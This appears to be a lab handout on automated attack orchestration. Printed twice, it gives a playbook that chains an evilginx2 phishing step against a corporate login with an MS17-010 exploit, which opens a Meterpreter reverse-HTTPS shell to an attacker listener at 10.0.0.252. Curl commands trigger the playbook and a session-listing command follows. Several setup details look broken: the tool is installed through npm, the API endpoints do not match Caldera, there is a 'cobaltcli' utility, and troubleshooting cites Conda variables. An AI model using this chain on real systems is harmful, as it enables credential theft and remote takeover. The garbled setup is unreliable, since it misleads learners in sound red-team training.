Lab 6 – Automated Attack Orchestration

Reference commands (full list) – see block below.



1\. Install \& Start Caldera

git clone https://github.com/mitre/caldera.git

cd caldera

npm ci

node main.js  # start the Caldera server

2\. Build an Automated Playbook

cat <<'EOF' > phish\_exploit.yml

\# Caldera YAML

name: Phish-then-CVE

type: agentless

platform: windows

actions:

&nbsp; - id: 1

&nbsp;   action: evilginx2

&nbsp;   arguments:

&nbsp;     url: https://corp.example.com/login

&nbsp;     lhost: 10.0.0.252

&nbsp;     lport: 443

&nbsp; - id: 2

&nbsp;   action: exploit

&nbsp;   arguments:

&nbsp;     payload: windows/meterpreter/reverse\_https

&nbsp;     exploit: ms17\_010

EOF



\# Register playbook

curl -X POST http://localhost:8888/api/v1/playbook/register \\

&nbsp; -H "Content-Type: application/json" -d @phish\_exploit.yml



\# Trigger execution

curl -X POST http://localhost:8888/api/v1/playbook/trigger \\

&nbsp; -H "Content-Type: application/json" \\

&nbsp; -d '{"playbook\_id":"Phish-then-CVE"}'

3\. Monitor Sessions

\# Sessions in the console

cobaltcli sessions list



\# Log raw events (optional)

cobaltcli sessions list -v > /tmp/orches-report.log

4\. Troubleshooting

Symptom	Fix

Playbook fails – 404	Verify Caldera server running, port 8888 open

Action fails	Check JSON formatting; add -w to curl to see response

No sessions	Confirm Conda environment variables, or portal TLS errors

5\. Full Commands

\# 1. Clone Caldera, install dependencies, start server

git clone https://github.com/mitre/caldera.git

cd caldera

npm ci

node main.js



\# 2. Write a Caldera YAML playbook

cat <<'EOF' > phish\_exploit.yml

name: Phish-then-CVE

type: agentless

platform: windows

actions:

&nbsp; - id: 1

&nbsp;   action: evilginx2

&nbsp;   arguments:

&nbsp;     url: https://corp.example.com/login

&nbsp;     lhost: 10.0.0.252

&nbsp;     lport: 443

&nbsp; - id: 2

&nbsp;   action: exploit

&nbsp;   arguments:

&nbsp;     payload: windows/meterpreter/reverse\_https

&nbsp;     exploit: ms17\_010

EOF



\# 3. Register the playbook

curl -X POST http://localhost:8888/api/v1/playbook/register \\

&nbsp; -H "Content-Type: application/json" -d @phish\_exploit.yml



\# 4. Trigger execution

curl -X POST http://localhost:8888/api/v1/playbook/trigger \\

&nbsp; -H "Content-Type: application/json" \\

&nbsp; -d '{"playbook\_id":"Phish-then-CVE"}'



\# 5. Verify sessions

cobaltcli sessions list -v > /tmp/orches-report.log

